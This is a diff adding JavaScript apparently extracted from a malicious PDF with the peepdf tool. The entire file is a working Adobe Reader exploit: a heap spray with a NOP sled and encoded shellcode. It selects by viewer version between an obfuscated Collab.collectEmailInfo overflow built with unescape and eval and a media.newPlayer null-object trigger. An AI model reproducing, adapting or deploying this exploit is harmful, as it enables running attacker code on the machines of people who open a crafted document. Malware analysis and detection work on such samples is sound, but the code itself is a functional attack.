@@ -1,0 +1,36 @@
+// peepdf comment: Javascript code located in object 8 (version 1)
+
+function re(count, what) {
+    var v = "";
+    while (--count >= 0)
+    v += what;
+    return v;
+}
+
+var forme = String.fromCharCode(53811, 51840, 49425, 5346, 51840, 17151, 2154, 21080, 11981, 15450, 29701, 17137, 64128, 30716, 26859, 44951, 52119, 0856, 29954, 26864, 37053, 39579, 0856, 1090, 58741, 49795, 65288, 52450, 16711);
+
+function Func8x9() {
+    var nopblock = re(13100, String.fromCharCode(3084));
+    var sgo = null;
+
+    for (var i = 0; i < 1800; i++) {
+        memory[i] = nopblock + nopblock + nopblock;
+        memory[i] += nopblock + nopblock + forme;
+    }
+    try {
+        this.media.newPlayer(sgo);
+    } catch (e) {
+        util.printd(String.fromCharCode(2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352, 2826, 4352), new Date());
+    };
+}
+
+var plin = "";
+var memory = new Array();
+if (app.viewerVersion < 8.0) {
+    if (app.viewerVersion < 7.0) plin = re(2008, unescape("%u06eb%u06eb%u0b0b%u0019")) + re(8, unescape("%u4141%u4141")) + forme;
+    else plin = re(4008, unescape("%u06eb%u06eb%u0b0b%u0028")) + re(8, unescape("%u4141%u4141")) + forme;
+
+    var kk = unescape("%43%6F%6C%6C%61%62%2E") + String.fromCharCode(0x63) + "ollectEmailInfo({subj: \"\", msg:plin})";
+    this.collabStore = eval(kk);
+} else Func8x9();
+
